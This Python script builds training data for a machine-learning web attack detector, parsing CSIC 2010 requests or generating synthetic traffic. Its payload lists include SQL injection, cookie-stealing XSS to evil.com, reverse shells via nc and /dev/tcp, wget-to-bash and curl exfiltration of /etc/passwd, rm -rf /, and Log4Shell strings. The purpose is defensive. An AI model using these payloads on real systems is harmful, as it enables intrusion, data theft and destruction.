import pandas as pd
import numpy as np
import re
import os
import json
from collections import Counter


os.makedirs("data/raw", exist_ok=True)
os.makedirs("data/processed", exist_ok=True)
os.makedirs("models", exist_ok=True)
os.makedirs("logs", exist_ok=True)


print("Dataset Preparation Module")




def parse_csic_file(filepath, label):
    """
    Parse the raw CSIC 2010 HTTP request format.
    Each request block is separated by blank lines.
    Returns list of dicts with method, url, body, headers.
    """
    records = []
    if not os.path.exists(filepath):
        return records

    with open(filepath, "r", errors="ignore") as f:
        raw = f.read()

    blocks = raw.strip().split("\n\n")
    for block in blocks:
        lines = block.strip().split("\n")
        if not lines or not lines[0].startswith(("GET", "POST", "PUT", "DELETE")):
            continue

        record = {"label": label, "is_malicious": 1 if label != "normal" else 0}
        first = lines[0].split()
        record["method"] = first[0] if len(first) > 0 else "GET"
        record["url"] = first[1] if len(first) > 1 else "/"
        record["body"] = ""
        record["user_agent"] = ""
        record["content_length"] = 0

        in_body = False
        for line in lines[1:]:
            if line == "":
                in_body = True
            elif in_body:
                record["body"] += line
            elif line.lower().startswith("user-agent:"):
                record["user_agent"] = line.split(":", 1)[1].strip()
            elif line.lower().startswith("content-length:"):
                try:
                    record["content_length"] = int(line.split(":", 1)[1].strip())
                except:
                    record["content_length"] = 0

        records.append(record)

    return records


#Synthetic Dataset Generator
def generate_synthetic_dataset(n_normal=3000, seed=42):
    """
    Generate realistic synthetic HTTP traffic.
    Covers: normal browsing + 5 attack categories.
    """
    rng = np.random.default_rng(seed)

    #Normal payloads
    normal_urls = [
        "/index.php?id={}", "/shop?cat={}&page={}", "/user/profile?uid={}",
        "/search?q=python+tutorial", "/api/products?limit=10&offset={}",
        "/blog/post/{}", "/login", "/register", "/about", "/contact",
        "/api/v1/users/{}", "/dashboard?view=stats", "/files/doc_{}.pdf",
        "/images/img_{}.jpg", "/css/style.css", "/js/app.js",
    ]
    normal_bodies = [
        "username=alice&password=securepass123",
        "email=user@example.com&name=John+Doe",
        "product_id={}&qty=2&action=add_cart",
        "search_term=laptop&category=electronics",
        "comment=Great+product!&rating=5",
        "page=1&limit=20&sort=price_asc",
        "",
    ]

    #SQL Injection payloads
    sqli_payloads = [
        "' OR '1'='1", "admin'--", "1' UNION SELECT NULL--",
        "' OR 1=1--", "1'; DROP TABLE users--",
        "1' AND SLEEP(5)--", "' OR '1'='1' /*",
        "1' UNION SELECT username,password FROM users--",
        "admin' OR 'a'='a", "1'; EXEC xp_cmdshell('dir')--",
        "' OR 1=1 LIMIT 1--", "1' ORDER BY 3--",
        "id=1 AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
        "UN/**/ION SE/**/LECT", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    ]

    #XSS payloads
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<iframe src='javascript:alert(1)'>",
        "javascript:alert(document.cookie)",
        "<body onload=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<script>document.location='http://evil.com?c='+document.cookie</script>",
        "';alert(String.fromCharCode(88,83,83))//",
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    ]

    #Path Traversal payloads
    path_payloads = [
        "../../etc/passwd", "..\\..\\windows\\system32\\cmd.exe",
        "....//....//....//etc/passwd", "%2e%2e%2fetc%2fpasswd",
        "../../../database/config.php", "..%2F..%2F..%2Fetc%2Fpasswd",
        "/var/www/html/../../../etc/shadow",
        "../../../../boot.ini", "../../../proc/self/environ",
    ]

    #Command Injection payloads
    cmd_payloads = [
        "; ls -la", "| cat /etc/passwd", "&& whoami",
        "; rm -rf /", "| nc attacker.com 4444 -e /bin/bash",
        "`id`", "$(id)", "; wget http://evil.com/shell.sh | bash",
        "& net user", "; python -c 'import socket,subprocess,os'",
        "| curl http://attacker.com/$(cat /etc/passwd | base64)",
    ]

    #HTTP Smuggling / Header Attacks
    header_payloads = [
        "() { :; }; echo; /bin/bash -c 'id'",   # Shellshock
        "() { ignored; }; /bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
        "${jndi:ldap://attacker.com/exploit}",   # Log4Shell style
        "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}",
    ]

    records = []

    # Normal traffic
    for i in range(n_normal):
        url_tmpl = rng.choice(normal_urls)
        url = url_tmpl.format(*[rng.integers(1, 500) for _ in range(3)])
        body_tmpl = rng.choice(normal_bodies)
        body = body_tmpl.format(*[rng.integers(1, 200) for _ in range(2)])
        records.append({
            "method": rng.choice(["GET", "POST"], p=[0.6, 0.4]),
            "url": url, "body": body,
            "user_agent": rng.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "Mozilla/5.0 (X11; Linux x86_64)",
                "curl/7.68.0", "python-requests/2.28.0",
            ]),
            "label": "normal", "is_malicious": 0,
        })

    # Attack traffic
    attack_classes = [
        (sqli_payloads, "sqli", 250),
        (xss_payloads, "xss", 200),
        (path_payloads, "path_traversal", 150),
        (cmd_payloads, "cmd_injection", 150),
        (header_payloads, "header_attack", 100),
    ]

    for payloads, label, n in attack_classes:
        for _ in range(n):
            payload = rng.choice(payloads)
            method = rng.choice(["GET", "POST"])
            if method == "GET":
                url = f"/search?q={payload}" if rng.random() > 0.5 else f"/id={payload}"
                body = ""
            else:
                url = rng.choice(["/login", "/api/data", "/search"])
                body = f"input={payload}&submit=1"
            records.append({
                "method": method, "url": url, "body": body,
                "user_agent": rng.choice([
                    "Mozilla/5.0 (compatible; MSIE 9.0)",
                    "sqlmap/1.7", "Nikto/2.1.6", "python-requests/2.28.0",
                ]),
                "label": label, "is_malicious": 1,
            })

    df = pd.DataFrame(records)
    return df.sample(frac=1, random_state=seed).reset_index(drop=True)


#Feature Engineering
def calculate_entropy(s: str) -> float:
    """Shannon entropy: measures randomness/obfuscation in payload."""
    if not s:
        return 0.0
    counts = Counter(s)
    total = len(s)
    return -sum((c / total) * np.log2(c / total) for c in counts.values())


def extract_features(row: dict) -> dict:
    """
    Extract numerical security features from an HTTP request.
    These features feed directly into the ML model.
    """
    url = str(row.get("url", ""))
    body = str(row.get("body", ""))
    method = str(row.get("method", "GET"))
    ua = str(row.get("user_agent", ""))

    # Combine URL and body for analysis
    payload = url + " " + body
    payload_lower = payload.lower()

    feats = {}

    #Lexical / Length features
    feats["url_length"] = len(url)
    feats["body_length"] = len(body)
    feats["payload_length"] = len(payload)
    feats["num_params"] = url.count("=")

    #Special character counts
    feats["count_single_quote"] = payload.count("'")
    feats["count_double_quote"] = payload.count('"')
    feats["count_semicolon"] = payload.count(";")
    feats["count_lt"] = payload.count("<")
    feats["count_gt"] = payload.count(">")
    feats["count_pipe"] = payload.count("|")
    feats["count_ampersand"] = payload.count("&")
    feats["count_dot"] = payload.count(".")
    feats["count_slash"] = payload.count("/")
    feats["count_backslash"] = payload.count("\\")
    feats["count_special"] = len(re.findall(r"[^a-zA-Z0-9\s]", payload))
    feats["ratio_special"] = feats["count_special"] / max(len(payload), 1)
    feats["ratio_alpha"] = sum(c.isalpha() for c in payload) / max(len(payload), 1)
    feats["ratio_digit"] = sum(c.isdigit() for c in payload) / max(len(payload), 1)

    #SQL Injection features
    sql_kw = r'\b(union|select|insert|update|delete|drop|create|alter|exec|'
    sql_kw += r'execute|cast|convert|declare|table|from|where|having|'
    sql_kw += r'order|group|by|or|and|not|null|sleep|benchmark|load_file)\b'
    feats["sql_keyword_count"] = len(re.findall(sql_kw, payload_lower))
    feats["has_sql_comment"] = int(bool(re.search(r'(--|\/\*|\*\/|#)', payload)))
    feats["has_tautology"] = int(bool(re.search(r"('|\")?\s*(or|and)\s+\d+=\d+", payload_lower)))
    feats["has_union_select"] = int(bool(re.search(r'union.{0,20}select', payload_lower)))
    feats["has_sleep"] = int(bool(re.search(r'sleep\s*\(\d+\)|benchmark\s*\(', payload_lower)))

    #XSS features
    feats["has_script_tag"] = int("<script" in payload_lower)
    feats["has_html_event"] = int(bool(re.search(r'on\w+\s*=', payload_lower)))
    feats["has_javascript_proto"] = int("javascript:" in payload_lower)
    feats["has_iframe"] = int("<iframe" in payload_lower)
    feats["has_onerror"] = int("onerror" in payload_lower or "onload" in payload_lower)
    feats["html_tag_count"] = len(re.findall(r'<[^>]+>', payload))

    #Path Traversal features
    feats["has_path_traversal"] = int(bool(re.search(r'\.\.[/\\]', payload)))
    feats["dotdot_count"] = payload.count("..")
    feats["has_etc_passwd"] = int("etc/passwd" in payload_lower or "etc\\passwd" in payload_lower)
    feats["has_win_system"] = int("windows" in payload_lower and "system32" in payload_lower)
    feats["percent_encoded_traversal"] = int(bool(re.search(r'%2e%2e[%2f5c]', payload_lower)))

    #Command Injection features
    feats["has_cmd_separator"] = int(bool(re.search(r'[;|&`$()]', payload)))
    feats["has_shell_cmd"] = int(bool(re.search(
        r'\b(cat|ls|id|whoami|wget|curl|nc|bash|sh|cmd|powershell|python|perl|ruby)\b',
        payload_lower
    )))
    feats["has_backtick"] = int("`" in payload)
    feats["has_dollar_paren"] = int("$(" in payload)

    #Header / Shellshock features
    feats["has_shellshock"] = int("() {" in payload or "(){" in payload)
    feats["has_jndi"] = int("jndi:" in payload_lower)

    #Encoding / Obfuscation features
    feats["pct_encoded_chars"] = len(re.findall(r'%[0-9a-fA-F]{2}', payload))
    feats["hex_sequences"] = len(re.findall(r'0x[0-9a-fA-F]+', payload_lower))
    feats["entropy"] = calculate_entropy(payload)
    feats["url_entropy"] = calculate_entropy(url)

    #HTTP metadata features
    feats["is_post"] = int(method.upper() == "POST")
    feats["is_get"] = int(method.upper() == "GET")
    feats["has_scanner_ua"] = int(bool(re.search(
        r'(sqlmap|nikto|nmap|masscan|dirbuster|gobuster|burp|zap|nessus)',
        ua.lower()
    )))

    return feats


#Main Pipeline
print("\n[1/4] Loading dataset...")

csic_records = []
for fname, label in [
    ("data/raw/normalTrafficTraining.txt", "normal"),
    ("data/raw/normalTrafficTest.txt", "normal"),
    ("data/raw/anomalousTrafficTest.txt", "attack"),
]:
    parsed = parse_csic_file(fname, label)
    csic_records.extend(parsed)
    if parsed:
        print(f"       Loaded {len(parsed):,} records from {fname}")

if csic_records:
    df_raw = pd.DataFrame(csic_records)
    # Map multi-class label to binary
    df_raw["is_malicious"] = (df_raw["label"] != "normal").astype(int)
    print(f"       CSIC 2010 total: {len(df_raw):,} records")
else:
    print("       CSIC 2010 files not found — using synthetic dataset")
    df_raw = generate_synthetic_dataset(n_normal=3000)

print(f"       Class distribution: {df_raw['is_malicious'].value_counts().to_dict()}")

print("\n[2/4] Extracting features...")
feature_records = []
for _, row in df_raw.iterrows():
    feats = extract_features(row.to_dict())
    feats["is_malicious"] = row["is_malicious"]
    feats["label"] = row.get("label", "unknown")
    feature_records.append(feats)

df_features = pd.DataFrame(feature_records)

# Drop label column before saving feature list
feature_cols = [c for c in df_features.columns if c not in ["is_malicious", "label"]]
print(f"       Extracted {len(feature_cols)} features per request")

print("\n[3/4] Balancing dataset with SMOTE...")
from imblearn.over_sampling import SMOTE
from sklearn.preprocessing import StandardScaler

X = df_features[feature_cols].fillna(0)
y = df_features["is_malicious"]

print(f"       Before SMOTE — Normal: {(y==0).sum()}, Malicious: {(y==1).sum()}")

smote = SMOTE(random_state=42, k_neighbors=5)
X_balanced, y_balanced = smote.fit_resample(X, y)

print(f"       After SMOTE  — Normal: {(y_balanced==0).sum()}, Malicious: {(y_balanced==1).sum()}")

df_balanced = pd.DataFrame(X_balanced, columns=feature_cols)
df_balanced["is_malicious"] = y_balanced

print("\n[4/4] Saving processed data...")
df_features.to_csv("data/processed/features_raw.csv", index=False)
df_balanced.to_csv("data/processed/features_balanced.csv", index=False)

# Save feature column list for deployment
with open("models/feature_columns.json", "w") as f:
    json.dump(feature_cols, f, indent=2)


print("Done!")
print(f"  Raw features:      data/processed/features_raw.csv")
print(f"  Balanced features: data/processed/features_balanced.csv")
print(f"  Feature list:      models/feature_columns.json")
print(f"  Total features:    {len(feature_cols)}")
print(f"  Balanced samples:  {len(df_balanced):,}")
